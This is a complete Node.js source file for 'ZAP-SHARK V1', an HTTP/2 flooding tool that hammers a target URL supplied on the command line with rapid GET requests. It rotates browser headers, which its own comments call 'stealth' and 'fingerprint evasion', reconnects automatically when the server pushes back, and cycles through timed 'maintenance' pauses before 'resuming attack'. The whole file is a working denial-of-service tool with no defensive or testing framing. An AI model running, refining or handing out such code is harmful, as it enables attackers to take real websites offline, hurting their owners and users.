const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000; // 1 hour
        this.maintenanceDuration = 600000;  // 10 minutes
        
        this.client = null;
        this.attackInterval = null;
        this.isClientConnected = false;

        // Enhanced metrics
        this.metrics = {
            successCount: 0,
            errorCount: 0,
            totalBytesSent: 0,
            peakRPS: 0,
            statusCodes: {}
        };

        // Request fingerprint evasion (NO RANDOM PATHS)
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ];

        this.acceptHeaders = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        ];

        this.currentUserAgentIndex = 0;
        this.currentAcceptIndex = 0;
    }

    async setupClient() {
        return new Promise((resolve) => {
            try {
                this.client = http2.connect(this.targetUrl);
                
                this.client.on('connect', () => {
                    this.isClientConnected = true;
                    this.logEvent('CLIENT_CONNECTED', `Connected to ${this.targetUrl}`);
                    resolve(true);
                });
                
                this.client.on('error', (err) => {
                    this.isClientConnected = false;
                    this.logEvent('CLIENT_ERROR', err.message);
                    setTimeout(() => this.setupClient(), 1000);
                    resolve(false);
                });
                
                this.client.on('goaway', () => {
                    this.isClientConnected = false;
                    this.logEvent('CLIENT_GOAWAY', 'Server sent GOAWAY frame');
                    setTimeout(() => this.setupClient(), 1000);
                });
                
            } catch (err) {
                this.isClientConnected = false;
                this.logEvent('SETUP_ERROR', err.message);
                setTimeout(() => this.setupClient(), 1000);
                resolve(false);
            }
        });
    }

    generateStealthHeaders() {
        // Rotate user agents and headers without random paths
        const headers = {
            ':method': 'GET',
            ':path': '/', // Fixed path as requested
            'user-agent': this.userAgents[this.currentUserAgentIndex],
            'accept': this.acceptHeaders[this.currentAcceptIndex],
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache',
            'pragma': 'no-cache'
        };

        // Rotate to next set of headers
        this.currentUserAgentIndex = (this.currentUserAgentIndex + 1) % this.userAgents.length;
        if (this.currentUserAgentIndex === 0) {
            this.currentAcceptIndex = (this.currentAcceptIndex + 1) % this.acceptHeaders.length;
        }

        return headers;
    }

    sendRequest() {
        if (!this.client || !this.isClientConnected) {
            return;
        }

        try {
            const headers = this.generateStealthHeaders();
            const req = this.client.request(headers);
            
            req.on('response', (headers) => {
                const status = headers[':status'];
                this.metrics.statusCodes[status] = (this.metrics.statusCodes[status] || 0) + 1;
                this.metrics.successCount++;
                req.destroy();
            });
            
            req.on('error', (err) => {
                this.metrics.errorCount++;
                this.logEvent('REQUEST_ERROR', err.message);
                req.destroy();
            });
            
            req.on('close', () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
                
                // Update peak RPS
                if (this.currentRPS > this.metrics.peakRPS) {
                    this.metrics.peakRPS = this.currentRPS;
                }
            });
            
            req.end();
            
        } catch (err) {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
            this.metrics.errorCount++;
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const display = `
ZAP-SHARK — (${this.formatRuntime()})
====================
T-ARP  — ${this.totalRequests}
====================
©ZAP-SHARK V1
RPS: ${this.currentRPS.toFixed(1)} | Status: ${this.status} | Peak: ${this.metrics.peakRPS.toFixed(1)}
Success: ${this.metrics.successCount} | Errors: ${this.metrics.errorCount}
Status Codes: ${Object.entries(this.metrics.statusCodes).map(([code, count]) => `${code}:${count}`).join(' ')}
        `.trim();
        
        process.stdout.write(`\r${display}`);
    }

    logEvent(type, message) {
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = `[${timestamp}] ${type}: ${message}\n`;
        
        // Write to console in a way that doesn't interfere with display
        process.stdout.write(`\n${logEntry}`);
        
        // Optional: Write to file
        try {
            require('fs').appendFileSync('zap-shark.log', logEntry);
        } catch (err) {
            // Silent fail for logging
        }
    }

    flushDNS() {
        this.logEvent('MAINTENANCE', 'Flushing DNS cache');
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches || echo "DNS flush attempted"', () => {});
        }
    }

    flushSockets() {
        this.logEvent('MAINTENANCE', 'Flushing sockets and reconnecting');
        this.isClientConnected = false;
        if (this.client) {
            try {
                this.client.destroy();
            } catch (err) {}
            this.client = null;
        }
        setTimeout(() => this.setupClient(), 100);
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.logEvent('MAINTENANCE', 'Starting 10-minute maintenance cycle');
            this.status = "PAUSED";
            
            this.flushDNS();
            this.flushSockets();
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        this.logEvent('MAINTENANCE', 'Maintenance completed - resuming attack');
        this.startAttack();
    }

    startAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                this.sendRequest();
                this.updateDisplay();
            }
        }, 0.1);
    }

    async start() {
        console.log("=== ZAP-SHARK V1 INITIATED ===");
        console.log("Protocol: HTTP/2 with Stealth Headers");
        console.log("Mode: High RPS + Fingerprint Evasion");
        console.log("Target:", this.targetUrl);
        console.log("Logging: zap-shark.log");
        console.log("=".repeat(40));
        
        this.logEvent('START', `ZAP-SHARK started targeting ${this.targetUrl}`);
        
        await this.setupClient();
        this.startAttack();
        
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        setInterval(() => {
            if (!this.isClientConnected && this.status === "ATTACKING") {
                this.setupClient();
            }
        }, 2000);
        
        process.on('SIGINT', () => {
            this.stop();
        });
    }

    stop() {
        this.running = false;
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        if (this.client) {
            try {
                this.client.destroy();
            } catch (err) {}
        }
        this.logEvent('STOP', `ZAP-SHARK stopped after ${this.formatRuntime()} runtime`);
        console.log('\n=== ZAP-SHARK STOPPED ===');
        process.exit(0);
    }
}

// Usage
const target = process.argv[2] || 'https://example.com';

if (!target.startsWith('https://')) {
    console.log('Error: Target must use HTTPS for HTTP/2');
    console.log('Usage: node zap-shark.js https://your-target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start().catch(err => {
    console.log('Failed to start:', err.message);
});
